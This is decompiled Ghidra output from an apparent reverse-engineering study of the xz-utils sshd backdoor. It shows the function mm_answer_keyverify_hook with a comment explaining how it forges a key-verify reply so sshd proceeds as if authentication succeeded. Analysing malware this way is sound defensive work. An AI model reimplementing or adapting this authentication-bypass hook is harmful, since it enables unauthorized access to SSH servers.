// /home/kali/xzre-ghidra/xzregh/108080_mm_answer_keyverify_hook.c
// Function: mm_answer_keyverify_hook @ 0x108080
// Calling convention: unknown
// Prototype: undefined mm_answer_keyverify_hook(void)


/*
 * AutoDoc: Uses the cached monitor payload context to send the prebuilt MONITOR_ANS_KEYVERIFY reply
 * directly to the requesting socket. After the write it restores the original
 * mm_answer_keyverify function pointer so sshd's dispatcher advances as if the verifier
 * succeeded, and if the write fails it terminates sshd via the libc exit import to avoid leaving
 * a half-patched state.
 */
#include "xzre_types.h"


undefined1  [16]
mm_answer_keyverify_hook(undefined8 param_1,undefined8 param_2,ulong param_3,undefined8 param_4)

{
  long lVar1;
  long lVar2;
  code *pcVar3;
  undefined1 auVar4 [16];
  long lVar5;
  undefined8 uVar6;
  undefined1 auVar7 [16];
  
  if (global_ctx == 0) {
    auVar4._8_8_ = 0;
    auVar4._0_8_ = param_3;
    return auVar4 << 0x40;
  }
  lVar1 = *(long *)(global_ctx + 0x10);
  if ((lVar1 != 0) && (lVar2 = *(long *)(global_ctx + 0x20), lVar2 != 0)) {
    if (*(short *)(lVar2 + 0x84) != 0) {
      if (*(long *)(lVar2 + 0x88) != 0) {
        lVar5 = fd_write();
        if (-1 < lVar5) {
          **(undefined8 **)(lVar2 + 0xa0) = *(undefined8 *)(lVar2 + 0xd8);
          uVar6 = 1;
          goto LAB_001080f3;
        }
      }
    }
    pcVar3 = *(code **)(lVar1 + 0x18);
    if (pcVar3 != (code *)0x0) {
      (*pcVar3)(0);
    }
  }
  uVar6 = 0;
LAB_001080f3:
  auVar7._8_8_ = param_4;
  auVar7._0_8_ = uVar6;
  return auVar7;
}

